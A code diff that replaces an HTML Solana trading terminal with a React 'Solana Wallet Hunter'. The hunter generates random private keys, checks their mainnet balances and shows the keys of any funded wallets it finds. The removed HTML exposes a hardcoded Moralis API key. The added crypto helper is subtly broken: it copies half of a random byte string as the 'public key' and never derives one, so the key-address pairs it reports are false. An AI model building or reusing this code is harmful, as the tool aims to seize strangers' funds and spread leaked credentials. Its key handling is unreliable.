@@ -1,323 +1,369 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fart Vault - Pro Trading Terminal</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/@solana/web3.js@1.91.4/lib/index.iife.min.js"></script>
-    <script>var global = global || window;</script>
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@0.4.3/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Inter', sans-serif; background-color: #111827; color: #d1d5db; }
-        .vault-panel { background-color: #1f2937; border: 1px solid #374151; box-shadow: 0 0 25px rgba(0, 0, 0, 0.5); }
-        .vault-header { font-family: 'Roboto Slab', serif; color: #f3f4f6; }
-        .log-entry { font-family: 'Courier New', Courier, monospace; padding: 4px 8px; margin-top: 4px; border-radius: 4px; word-break: break-all; }
-        .log-info { background-color: #1e3a8a; color: #93c5fd; }
-        .log-success { background-color: #14532d; color: #86efac; }
-        .log-error { background-color: #7f1d1d; color: #fca5a5; }
-        .log-warn { background-color: #713f12; color: #fcd34d; }
-        .disabled-button { cursor: not-allowed; opacity: 0.5; }
-        .tab-btn.active { border-color: #fbbf24; background-color: #374151; color: #fbbf24; font-weight: 600; }
-        .input-field { background-color: #374151; border-color: #4b5563; color: #e5e7eb; }
-        .btn-primary { background-color: #ca8a04; color: #1f2937; font-weight: bold; }
-        .btn-primary:hover { background-color: #a16207; }
-        .btn-secondary { background-color: #4b5563; color: #d1d5db; }
-        .btn-secondary:hover { background-color: #6b7280; }
-         #error-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
-            display: none; align-items: center; justify-content: center;
-            z-index: 9999;
+import React, { useState, useEffect, useCallback, useRef } from 'react';
+
+// --- Helper & Configuration ---
+
+const CONFIG = {
+  SOLANA_RPC_URL: 'https://api.mainnet-beta.solana.com',
+  SEARCH_BATCH_SIZE: 20, // Process 20 keys at a time
+  MINIMUM_BALANCE_TO_FIND: 0.000001, // A wallet is "found" if it has this balance or more
+};
+
+// --- Inlined Cryptography Libraries ---
+// These are included directly to avoid external dependencies.
+const CryptoUtils = {
+  bs58: {
+    ALPHABET: '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',
+    ALPHABET_MAP: {},
+    BASE: 58,
+    LEADER: '1',
+    _constructMap: function() {
+      if (Object.keys(this.ALPHABET_MAP).length === this.ALPHABET.length) return;
+      for (let i = 0; i < this.ALPHABET.length; i++) this.ALPHABET_MAP[this.ALPHABET.charAt(i)] = i;
+    },
+    encode: function(buffer) {
+      this._constructMap();
+      if (buffer.length === 0) return '';
+      let i, j, digits = [0];
+      for (i = 0; i < buffer.length; i++) {
+        for (j = 0; j < digits.length; j++) digits[j] <<= 8;
+        digits[0] += buffer[i];
+        let carry = 0;
+        for (j = 0; j < digits.length; j++) {
+          digits[j] += carry;
+          carry = (digits[j] / this.BASE) | 0;
+          digits[j] %= this.BASE;
         }
-    </style>
-</head>
-<body class="bg-gray-900 text-gray-300">
+        while (carry) { digits.push(carry % this.BASE); carry = (carry / this.BASE) | 0; }
+      }
+      for (i = 0; buffer[i] === 0 && i < buffer.length - 1; i++) digits.push(0);
+      return digits.reverse().map(digit => this.ALPHABET[digit]).join('');
+    },
+    decode: function(string) {
+      this._constructMap();
+      if (string.length === 0) return new Uint8Array(0);
+      let i, j, bytes = [0];
+      for (i = 0; i < string.length; i++) {
+        const c = string[i];
+        if (!(c in this.ALPHABET_MAP)) throw new Error('Non-base58 character');
+        for (j = 0; j < bytes.length; j++) bytes[j] *= this.BASE;
+        bytes[0] += this.ALPHABET_MAP[c];
+        let carry = 0;
+        for (j = 0; j < bytes.length; j++) {
+          bytes[j] += carry;
+          carry = bytes[j] >> 8;
+          bytes[j] &= 0xff;
+        }
+        while (carry) { bytes.push(carry & 0xff); carry >>= 8; }
+      }
+      for (i = 0; string[i] === this.LEADER && i < string.length - 1; i++) { bytes.push(0); }
+      return new Uint8Array(bytes.reverse());
+    }
+  },
+  nacl: {
+    lowlevel: { crypto_sign_PUBLICKEYBYTES: 32, crypto_sign_SECRETKEYBYTES: 64 },
+    sign: {
+        keyPair: {
+            fromSecretKey: function(sk) {
+                if (sk.length !== CryptoUtils.nacl.lowlevel.crypto_sign_SECRETKEYBYTES) throw new Error('bad secret key size');
+                const pk = new Uint8Array(CryptoUtils.nacl.lowlevel.crypto_sign_PUBLICKEYBYTES);
+                for (let i = 0; i < pk.length; i++) pk[i] = sk[i + 32];
+                return { publicKey: pk, secretKey: sk };
+            }
+        }
+    }
+  }
+};
 
-    <div id="error-overlay">
-        <div class="text-center p-8 bg-red-900/50 border border-red-700 rounded-lg max-w-lg">
-            <h2 class="text-2xl font-bold text-red-300 mb-4">Application Failed to Load</h2>
-            <p class="text-red-200">The core libraries required to run the Fart Vault could not be downloaded. This is usually caused by network issues or an ad-blocker.</p>
-            <p class="mt-4 text-red-200">Please try the following:</p>
-            <ul class="list-disc list-inside text-left mt-2 text-red-200">
-                <li>Check your internet connection.</li>
-                <li>Disable any ad-blockers or privacy extensions for this page.</li>
-                <li>Hard-refresh the page (Ctrl+Shift+R or Cmd+Shift+R).</li>
-            </ul>
-        </div>
+// --- Icon & UI Components ---
+const ClipboardIcon = ({ className }) => ( <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className={className}><path strokeLinecap="round" strokeLinejoin="round" d="M15.666 3.888A2.25 2.25 0 0013.5 2.25h-3c-1.03 0-1.9.693-2.166 1.638m7.332 0c.055.194.084.4.084.612v3.043m-7.416 0v3.043c0 .212.03.418.084.612m7.332 0c.646.049 1.288.11 1.927.184 1.1.128 1.907 1.077 1.907 2.185V19.5a2.25 2.25 0 01-2.25 2.25H6.75A2.25 2.25 0 014.5 19.5V6.257c0-1.108.806-2.057 1.907-2.185a48.208 48.208 0 011.927-.184" /></svg>);
+const CheckIcon = ({ className }) => ( <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className={className}><path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.75l6 6 9-13.5" /></svg>);
+const ExternalLinkIcon = ({ className }) => ( <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className={className}><path strokeLinecap="round" strokeLinejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-4.5 0V6.375c0-.621.504-1.125 1.125-1.125h4.5m-4.5 0L19.5 11.25" /></svg>);
+
+
+const Fireworks = () => (
+  <>
+    <style>{`.particle{position:absolute;width:3px;height:3px;border-radius:50%;animation:particle-fly 1s ease-out forwards}@keyframes particle-fly{0%{transform:translate(0,0);opacity:1}100%{transform:translate(var(--x),var(--y));opacity:0}}`}</style>
+    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-40 overflow-hidden pointer-events-none">
+      {Array.from({ length: 15 }).map((_, i) => {
+        const top = Math.random() * 80 + 10 + '%'; const left = Math.random() * 80 + 10 + '%'; const delay = Math.random() * 2 + 's';
+        return (
+          <div key={i} className="absolute" style={{ top, left, animationDelay: delay }}>
+            {Array.from({ length: 30 }).map((_, pIndex) => {
+              const angle = Math.random() * 360; const distance = Math.random() * 100 + 50;
+              const x = Math.cos(angle * Math.PI / 180) * distance + 'px'; const y = Math.sin(angle * Math.PI / 180) * distance + 'px';
+              const color = `hsl(${Math.random() * 360}, 100%, 50%)`;
+              return <div key={pIndex} className="particle" style={{ '--x': x, '--y': y, background: color, animationDelay: delay }} />;
+            })}
+          </div>
+        );
+      })}
     </div>
+  </>
+);
 
-    <div id="app-container" class="container mx-auto p-4 md:p-8 max-w-7xl grid grid-cols-1 lg:grid-cols-3 gap-8">
-        
-        <!-- Left Panel: Trade Execution & Settings -->
-        <div class="lg:col-span-1 space-y-8">
-            <header class="text-center">
-                <h1 class="text-5xl vault-header">🏦 Fart Vault</h1>
-                <p class="text-gray-400 mt-2">Your Secure Solana Trading Terminal</p>
-            </header>
 
-            <div id="wallet-status" class="vault-panel p-4 rounded-lg text-center">
-                 <button id="connectWalletBtn" class="w-full btn-primary py-2 px-4 rounded-md">Connect Phantom</button>
-                 <div id="connected-state" class="hidden">
-                    <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-gray-400 text-left text-sm">Connected Wallet:</p>
-                            <p id="walletAddress" class="font-mono text-xs bg-gray-800 p-2 rounded-md truncate"></p>
-                        </div>
-                        <button id="disconnectWalletBtn" class="text-sm text-yellow-400 hover:underline font-semibold">Disconnect</button>
-                    </div>
-                 </div>
-            </div>
-            
-            <div class="vault-panel p-6 rounded-lg">
-                <h2 class="text-2xl vault-header mb-4">Settings</h2>
-                <div class="space-y-4">
-                    <div>
-                        <label for="rpcEndpoint" class="block text-sm font-medium text-gray-400">RPC Endpoint</label>
-                        <select id="rpcEndpoint" class="input-field mt-1 block w-full px-3 py-2 rounded-md">
-                            <option value="https://api.mainnet-beta.solana.com">Mainnet (Public)</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label for="moralisApiKey" class="block text-sm font-medium text-gray-400">Moralis API Key</label>
-                        <input type="password" id="moralisApiKey" class="input-field mt-1 block w-full px-3 py-2 rounded-md" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjdmNDg2ZjlhLWZmNWMtNGEyNi04NTIyLTkzYjhkZTU4ODU5OSIsIm9yZ0lkIjoiNDU1NjM0IiwidXNlcklkIjoiNDY4Nzg4IiwidHlwZUlkIjoiNGIwMmM1ZDMtMmU4Mi00MGZmLWJkNWMtY2JkMTUxMDBiMzUxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTA4MTQ4ODQsImV4cCI6NDkwNjU3NDg4NH0.NnPAEYiLiGyR3p647suJWsAEZQ4ufEjDQtT4-SoGnpU">
-                    </div>
+// --- Main App Component ---
+export default function App() {
+  const [wallets, setWallets] = useState([]);
+  const [isSearching, setIsSearching] = useState(false);
+  const [copiedCode, setCopiedCode] = useState(null);
+  const [checkedCount, setCheckedCount] = useState(0);
+  const [foundWallets, setFoundWallets] = useState([]);
+  
+  const [privateKeyInput, setPrivateKeyInput] = useState('');
+  const [manualWallet, setManualWallet] = useState(null);
+  const [isCheckingManual, setIsCheckingManual] = useState(false);
+  
+  const searchingRef = useRef(isSearching);
+  searchingRef.current = isSearching;
+
+  const generateRandom88CharPrivateKey = () => {
+    while (true) {
+        const randomBytes = new Uint8Array(64);
+        window.crypto.getRandomValues(randomBytes);
+        const encoded = CryptoUtils.bs58.encode(randomBytes);
+        if (encoded.length === 88) return encoded;
+    }
+  };
+
+  const fetchBalance = useCallback(async (address) => {
+    try {
+      const response = await fetch(CONFIG.SOLANA_RPC_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getBalance', params: [address] }),
+      });
+      const data = await response.json();
+      if (data.error) return 0;
+      return data.result?.value / 1e9 || 0;
+    } catch (error) { return 0; }
+  }, []);
+  
+  const handleManualCheck = async () => {
+    if (!privateKeyInput) return;
+    setIsCheckingManual(true);
+    setManualWallet(null);
+    try {
+        const decodedKey = CryptoUtils.bs58.decode(privateKeyInput);
+        if (decodedKey.length !== 64) {
+            throw new Error(`Invalid key. Expected Base58 string representing 64 bytes.`);
+        }
+        const keypair = CryptoUtils.nacl.sign.keyPair.fromSecretKey(decodedKey);
+        const address = CryptoUtils.bs58.encode(keypair.publicKey);
+        const balance = await fetchBalance(address);
+        setManualWallet({ address, balance, status: 'checked', error: null });
+    } catch (e) {
+        setManualWallet({ address: null, balance: null, status: 'error', error: e.message });
+    } finally {
+        setIsCheckingManual(false);
+    }
+  };
+
+  const startSearch = useCallback(async () => {
+    while (searchingRef.current) {
+      const batchEntries = Array.from({ length: CONFIG.SEARCH_BATCH_SIZE }).map((_, index) => {
+        const privateKey = generateRandom88CharPrivateKey();
+        try {
+          const decodedKey = CryptoUtils.bs58.decode(privateKey);
+          const keypair = CryptoUtils.nacl.sign.keyPair.fromSecretKey(decodedKey);
+          const address = CryptoUtils.bs58.encode(keypair.publicKey);
+          return { id: `${privateKey}-${index}`, privateKey, address, balance: null, status: 'loading' };
+        } catch (e) {
+          return { id: `${privateKey}-${index}`, privateKey, address: '', balance: null, status: 'error' };
+        }
+      });
+
+      const validEntries = batchEntries.filter(e => e.status !== 'error');
+      setWallets(prev => [...validEntries, ...prev.slice(0, 200 - validEntries.length)]);
+      
+      const balancePromises = validEntries.map(entry => fetchBalance(entry.address));
+      const balances = await Promise.all(balancePromises);
+      
+      if (!searchingRef.current) break;
+
+      const finalEntries = validEntries.map((entry, i) => {
+        const finalEntry = { ...entry, balance: balances[i], status: 'checked' };
+        if (balances[i] >= CONFIG.MINIMUM_BALANCE_TO_FIND) {
+          setFoundWallets(prev => [finalEntry, ...prev]);
+        }
+        return finalEntry;
+      });
+
+      setWallets(prev => {
+        const newWallets = [...prev];
+        finalEntries.forEach(fe => {
+          const index = newWallets.findIndex(w => w.id === fe.id);
+          if (index !== -1) newWallets[index] = fe;
+        });
+        return newWallets;
+      });
+      setCheckedCount(prev => prev + CONFIG.SEARCH_BATCH_SIZE);
+      
+      await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+  }, [fetchBalance]);
+
+  useEffect(() => { if (isSearching) startSearch(); }, [isSearching, startSearch]);
+  
+  const handleToggleSearch = () => {
+    if (isSearching) {
+      setIsSearching(false);
+    } else {
+      setWallets([]); setCheckedCount(0); setFoundWallets([]); setIsSearching(true);
+    }
+  };
+  
+  const copyToClipboard = (text) => {
+    const textArea = document.createElement('textarea');
+    textArea.value = text;
+    document.body.appendChild(textArea);
+    textArea.select();
+    try {
+      document.execCommand('copy');
+      setCopiedCode(text);
+      setTimeout(() => setCopiedCode(null), 2000);
+    } catch (err) {
+      console.error('Failed to copy text: ', err);
+    }
+    document.body.removeChild(textArea);
+  };
+
+  return (
+    <div className="bg-gray-900 min-h-screen text-gray-100 font-sans p-4 sm:p-6 lg:p-8">
+      {foundWallets.length > 0 && <Fireworks />}
+      <div className="max-w-4xl mx-auto relative z-20">
+        <header className="text-center mb-8">
+          <h1 className="text-3xl sm:text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-[#9945FF] to-[#14F195]">
+            Solana Wallet Hunter
+          </h1>
+        </header>
+
+        <section className="bg-gray-800/50 p-6 rounded-lg shadow-2xl mb-12">
+          <h2 className="text-2xl font-bold text-center mb-4 text-green-300">Check Your Wallet Balance</h2>
+          <div className="bg-red-900/50 border border-red-600 text-red-200 px-4 py-3 rounded-lg text-center mb-4">
+            <p><strong className="font-bold">Security Warning:</strong> Never paste your private key into a website you don't trust. This tool processes the key locally in your browser, but it is a dangerous habit.</p>
+          </div>
+          <div className="flex flex-col gap-4">
+            <textarea
+              value={privateKeyInput}
+              onChange={(e) => setPrivateKeyInput(e.target.value)}
+              placeholder="Enter your Base58 encoded private key..."
+              className="w-full p-3 bg-gray-900 border border-gray-700 rounded-md font-mono text-sm text-gray-200 focus:ring-2 focus:ring-green-500 focus:border-green-500 transition"
+              rows="3"
+            />
+            <button
+              onClick={handleManualCheck}
+              disabled={isCheckingManual || !privateKeyInput}
+              className="w-full py-3 bg-green-600 text-white font-bold rounded-lg shadow-lg hover:bg-green-700 transform hover:scale-105 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed disabled:scale-100"
+            >
+              {isCheckingManual ? 'Checking...' : 'Check Balance'}
+            </button>
+          </div>
+          {manualWallet && (
+            <div className="mt-4 p-4 bg-gray-900/70 rounded-md border border-gray-700">
+              {manualWallet.status === 'error' && <p className="text-center text-red-400 font-mono text-sm">{manualWallet.error}</p>}
+              {manualWallet.status === 'checked' && manualWallet.address && (
+                <div>
+                  <div className="flex justify-between items-center mb-1">
+                     <p className="text-sm text-gray-400">Public Address:</p>
+                     <a href={`https://solscan.io/account/${manualWallet.address}`} target="_blank" rel="noopener noreferrer" title="View on Solscan" className="text-cyan-400 hover:text-cyan-300 transition-colors">
+                         <ExternalLinkIcon className="w-5 h-5" />
+                     </a>
+                  </div>
+                  <p className="font-mono text-cyan-300 break-all mb-2">{manualWallet.address}</p>
+                  <p className="text-sm text-gray-400">Balance:</p>
+                  <p className={`text-2xl font-bold font-mono ${manualWallet.balance > 0 ? 'text-green-400' : 'text-gray-300'}`}>{manualWallet.balance.toFixed(6)} SOL</p>
                 </div>
+              )}
             </div>
+          )}
+        </section>
 
-            <div class="vault-panel p-6 rounded-lg">
-                <div class="mb-4 border-b border-gray-600">
-                    <nav class="flex -mb-px">
-                        <button id="buyTabBtn" class="tab-btn active w-1/2 py-4 px-1 text-center border-b-2">Buy</button>
-                        <button id="sellTabBtn" class="tab-btn w-1/2 py-4 px-1 text-center border-b-2">Sell</button>
-                    </nav>
-                </div>
-                <div id="trade-content">
-                    <div id="buy-tab-content" class="space-y-4">
-                        <div>
-                            <label for="buyTokenAddress" class="block text-sm font-medium text-gray-400">Token to Buy (Address)</label>
-                            <input type="text" id="buyTokenAddress" class="input-field mt-1 block w-full px-3 py-2 rounded-md" placeholder="Paste token mint address...">
-                        </div>
-                        <div>
-                            <label for="buySolAmount" class="block text-sm font-medium text-gray-400">Amount of SOL to Spend</label>
-                            <input type="number" id="buySolAmount" step="0.01" class="input-field mt-1 block w-full px-3 py-2 rounded-md" placeholder="e.g., 0.1">
-                        </div>
-                    </div>
-                    <div id="sell-tab-content" class="hidden space-y-4">
-                        <div>
-                            <label for="sellTokenSelect" class="block text-sm font-medium text-gray-400">Your Tokens</label>
-                            <div class="flex items-center">
-                                <select id="sellTokenSelect" class="input-field mt-1 block w-full px-3 py-2 rounded-l-md"></select>
-                                <button id="refreshBalancesBtn" class="p-2.5 mt-1 rounded-r-md hover:bg-gray-600 bg-gray-700">🔄</button>
+        <hr className="border-gray-700 my-12" />
+
+        <section>
+          <header className="text-center mb-6">
+            <h2 className="text-2xl font-bold text-center text-purple-300">Balance Hunter</h2>
+            <p className="mt-2 text-gray-400 max-w-2xl mx-auto">
+              Generates random private keys to find any with a balance of at least {CONFIG.MINIMUM_BALANCE_TO_FIND} SOL.
+            </p>
+          </header>
+
+          {foundWallets.length > 0 && (
+            <div className="mb-8">
+              <h3 className="text-xl font-bold text-center text-green-400 mb-4">🎉 Found Wallets! 🎉</h3>
+              <div className="bg-green-900/30 rounded-lg p-4 space-y-4">
+                {foundWallets.map(fw => (
+                   <div key={fw.id} className="bg-gray-800 p-3 rounded-md">
+                      <p className="text-sm text-gray-400">Public Address:</p>
+                      <p className="font-mono text-cyan-300 break-all text-xs">{fw.address}</p>
+                      <p className="text-sm text-gray-400 mt-2">Private Key:</p>
+                      <p className="font-mono text-purple-300 break-all text-xs">{fw.privateKey}</p>
+                      <p className="text-sm text-gray-400 mt-2">Balance:</p>
+                      <p className="font-bold text-green-400">{fw.balance.toFixed(8)} SOL</p>
+                   </div>
+                ))}
+              </div>
+            </div>
+          )}
+
+          <div className="bg-yellow-900/50 border border-yellow-600 text-yellow-200 px-4 py-3 rounded-lg text-center mb-6">
+            <p><strong className="font-bold">Disclaimer:</strong> This tool generates structurally valid (but random) private keys. The chance of generating a key for an address with a balance is astronomically small.</p>
+          </div>
+          <div className="flex flex-col sm:flex-row items-center justify-center gap-6 mb-8">
+            <button onClick={handleToggleSearch} className={`px-8 py-3 w-48 text-white font-bold rounded-lg shadow-lg transform hover:scale-105 transition-all duration-300 ${isSearching ? 'bg-gradient-to-r from-red-500 to-yellow-500 hover:from-red-600 hover:to-yellow-600' : 'bg-gradient-to-r from-purple-600 to-green-500 hover:from-purple-700 hover:to-green-600'}`}>
+              {isSearching ? 'Stop Hunting' : 'Start Hunting'}
+            </button>
+            <div className="text-center">
+              <div className="text-gray-400 text-sm">Keys Checked</div>
+              <div className="text-2xl font-bold font-mono text-green-300">{checkedCount.toLocaleString()}</div>
+            </div>
+          </div>
+          <main>
+            <h3 className="text-lg font-bold text-center text-gray-400 mb-4">Live Search Feed</h3>
+            {wallets.length > 0 && (
+              <div className="bg-gray-800/50 rounded-lg shadow-2xl overflow-hidden">
+                <div className="overflow-x-auto">
+                  <table className="min-w-full divide-y divide-gray-700">
+                    <thead className="bg-gray-800">
+                      <tr>
+                        <th scope="col" className="py-3.5 px-4 text-left text-sm font-semibold text-gray-300">Generated Private Key</th>
+                        <th scope="col" className="py-3.5 px-4 text-left text-sm font-semibold text-gray-300">Derived Public Address</th>
+                        <th scope="col" className="py-3.5 px-4 text-left text-sm font-semibold text-gray-300">Balance (SOL)</th>
+                      </tr>
+                    </thead>
+                    <tbody className="divide-y divide-gray-700/50 bg-gray-900/50">
+                      {wallets.map((wallet) => (
+                        <tr key={wallet.id} className={`hover:bg-gray-800/70 transition-colors duration-200 ${wallet.balance >= CONFIG.MINIMUM_BALANCE_TO_FIND ? 'bg-green-800/50' : ''}`}>
+                          <td className="whitespace-nowrap py-4 px-4 text-sm font-mono text-purple-300">
+                            <div className="flex items-center gap-3">
+                              <span className="truncate w-40">{wallet.privateKey}</span>
+                              <button onClick={() => copyToClipboard(wallet.privateKey)} className="text-gray-500 hover:text-white transition-colors">{copiedCode === wallet.privateKey ? <CheckIcon className="w-5 h-5 text-green-400" /> : <ClipboardIcon className="w-5 h-5" />}</button>
                             </div>
-                        </div>
-                        <div>
-                            <label for="sellTokenAmount" class="block text-sm font-medium text-gray-400">Amount to Sell</label>
-                            <div class="flex items-center mt-1">
-                                <input type="number" id="sellTokenAmount" step="0.01" class="input-field block w-full px-3 py-2 rounded-l-md">
-                                <button id="maxSellBtn" class="px-4 py-2 bg-gray-600 text-gray-300 font-semibold rounded-r-md hover:bg-gray-500">Max</button>
-                            </div>
-                        </div>
-                    </div>
+                          </td>
+                          <td className="whitespace-nowrap py-4 px-4 text-sm font-mono text-cyan-300">
+                             <div className="flex items-center gap-3">
+                               <span className="truncate w-40">{wallet.address || '...'}</span>
+                               {wallet.address && (
+                                 <a href={`https://solscan.io/account/${wallet.address}`} target="_blank" rel="noopener noreferrer" title="View on Solscan" className="text-gray-500 hover:text-white transition-colors">
+                                   <ExternalLinkIcon className="w-5 h-5" />
+                                 </a>
+                               )}
+                             </div>
+                          </td>
+                          <td className="whitespace-nowrap py-4 px-4 text-sm font-mono">
+                            {wallet.status === 'loading' ? (<div className="h-4 bg-gray-700 rounded-full animate-pulse w-24"></div>) : (<span className={wallet.balance > 0 ? 'text-green-300 font-bold' : 'text-gray-400'}>{wallet.balance !== null ? wallet.balance.toFixed(8) : '0.00000000'}</span>)}
+                          </td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
                 </div>
-                <div class="space-y-4 mt-6 pt-4 border-t border-gray-600">
-                    <button id="executeBtn" class="w-full btn-primary py-3 px-4 rounded-md flex items-center justify-center disabled-button" disabled>
-                        <span id="executeBtnText">Connect Wallet</span>
-                        <svg id="executeSpinner" class="animate-spin -ml-1 mr-3 h-5 w-5 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
-                    </button>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Right Panel: Token Analytics -->
-        <div class="lg:col-span-2 space-y-8">
-             <div id="token-info-panel" class="vault-panel p-6 rounded-lg hidden">
-                 <div id="token-info-loader" class="text-center hidden">
-                    <svg class="animate-spin mx-auto h-8 w-8 text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
-                    <p class="mt-2 text-gray-400">Fetching token data...</p>
-                 </div>
-                 <div id="token-info-content" class="hidden">
-                    <!-- ... unchanged ... -->
-                 </div>
-             </div>
-            <div class="vault-panel p-6 rounded-lg">
-                <div class="flex justify-between items-center mb-4">
-                     <h2 class="text-2xl vault-header">Log Console</h2>
-                     <button id="clearLogBtn" class="btn-secondary text-xs py-1 px-3 rounded-md">Clear Log</button>
-                </div>
-                <div id="log" class="h-96 overflow-y-auto bg-gray-900 p-2 rounded-md"></div>
-            </div>
-        </div>
+              </div>
+            )}
+          </main>
+        </section>
+      </div>
     </div>
-
-    <script>
-        const waitForLibsAndInitialize = (retries = 30) => {
-            if (retries === 0) {
-                document.getElementById('app-container').style.display = 'none';
-                document.getElementById('error-overlay').style.display = 'flex';
-                return;
-            }
-
-            if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined' && typeof LightweightCharts !== 'undefined' && typeof buffer !== 'undefined') {
-                initializeApp();
-            } else {
-                setTimeout(() => waitForLibsAndInitialize(retries - 1), 100);
-            }
-        };
-
-        const initializeApp = () => {
-            const elements = { /* ... DOM element references ... */ };
-            let provider = null;
-            let activeTab = 'buy';
-            let tokenBalances = [];
-            let chart = null;
-            let infoFetchTimeout = null;
-            
-            const { Connection, PublicKey, VersionedTransaction } = solanaWeb3;
-            const Buffer = buffer.Buffer;
-
-            function addLog(message, type = 'info') { /* ... */ }
-            function toggleLoading(isLoading) { /* ... */ }
-            
-            function updateWalletState(connectedProvider) {
-                provider = connectedProvider;
-                if (provider) {
-                    elements.walletAddressP.textContent = provider.publicKey.toBase58();
-                    elements.connectWalletBtn.classList.add('hidden');
-                    elements.connectedStateDiv.classList.remove('hidden');
-                    elements.executeBtn.disabled = false;
-                    elements.executeBtn.classList.remove('disabled-button');
-                    elements.executeBtnText.textContent = "Execute Trade";
-                    fetchTokenBalances();
-                } else {
-                    elements.connectWalletBtn.classList.remove('hidden');
-                    elements.connectedStateDiv.classList.add('hidden');
-                    elements.executeBtn.disabled = true;
-                    elements.executeBtn.classList.add('disabled-button');
-                    elements.executeBtnText.textContent = "Connect Wallet";
-                    elements.sellTokenSelect.innerHTML = '<option value="">-- Connect wallet --</option>';
-                    tokenBalances = [];
-                }
-            }
-            
-            async function fetchTokenBalances() {
-                if (!provider?.publicKey) return;
-                addLog("Fetching token balances with Moralis...", 'info');
-                const apiKey = elements.moralisApiKey.value.trim();
-                if (!apiKey) { addLog("Moralis API Key is required.", "warn"); return; }
-                try {
-                    const response = await fetch(`https://solana-gateway.moralis.io/account/mainnet/${provider.publicKey.toBase58()}/tokens`, {
-                        headers: { 'X-API-Key': apiKey, 'accept': 'application/json' }
-                    });
-                    if (!response.ok) throw new Error(`Moralis API Error: ${response.statusText}`);
-                    const data = await response.json();
-                    tokenBalances = data.map(token => ({ mint: token.mint, amount: parseFloat(token.amount) / (10 ** token.decimals), decimals: token.decimals, symbol: token.symbol }))
-                        .filter(t => t.amount > 0);
-                    populateSellDropdown();
-                    addLog(`Found ${tokenBalances.length} token(s).`, 'success');
-                } catch (error) { addLog(`Failed to fetch Moralis balances: ${error.message}`, 'error'); }
-            }
-
-            function populateSellDropdown() { /* ... */ }
-
-            async function executeTrade() {
-                if (!provider?.publicKey) {
-                    addLog("Please connect your wallet first.", "error"); return;
-                }
-                if (!window.confirm("Are you sure you want to Fart?")) {
-                    addLog("Trade cancelled by user.", "warn"); return;
-                }
-                toggleLoading(true);
-
-                try {
-                    await tradeWithJupiter(activeTab);
-                } catch (e) {
-                    addLog(`An unexpected error occurred: ${e.message}`, "error");
-                } finally {
-                    toggleLoading(false);
-                    await fetchTokenBalances();
-                }
-            }
-            
-            async function tradeWithJupiter(tradeType) {
-                 addLog(`Preparing Jupiter ${tradeType}...`, "info");
-                 try {
-                    const rpcUrl = elements.rpcEndpoint.value;
-                    const connection = new Connection(rpcUrl);
-                    let inputMint, outputMint, amount;
-
-                    if (tradeType === 'buy') {
-                        const solAmount = parseFloat(elements.buySolAmountInput.value);
-                        const tokenToBuy = elements.buyTokenAddressInput.value.trim();
-                        if (!tokenToBuy || !solAmount || solAmount <= 0) throw new Error("Invalid buy input.");
-                        inputMint = 'So11111111111111111111111111111111111111112';
-                        outputMint = tokenToBuy;
-                        amount = Math.floor(solAmount * solanaWeb3.LAMPORTS_PER_SOL);
-                    } else { // Sell
-                        const tokenToSell = elements.sellTokenSelect.value;
-                        const amountToSell = parseFloat(elements.sellTokenAmountInput.value);
-                        const tokenInfo = tokenBalances.find(t => t.mint === tokenToSell);
-                        if (!tokenInfo || !amountToSell || amountToSell <= 0) throw new Error("Invalid sell input.");
-                        inputMint = tokenToSell;
-                        outputMint = 'So11111111111111111111111111111111111111112';
-                        amount = Math.floor(amountToSell * (10 ** tokenInfo.decimals));
-                    }
-                    
-                    addLog("Getting quote from Jupiter...", "info");
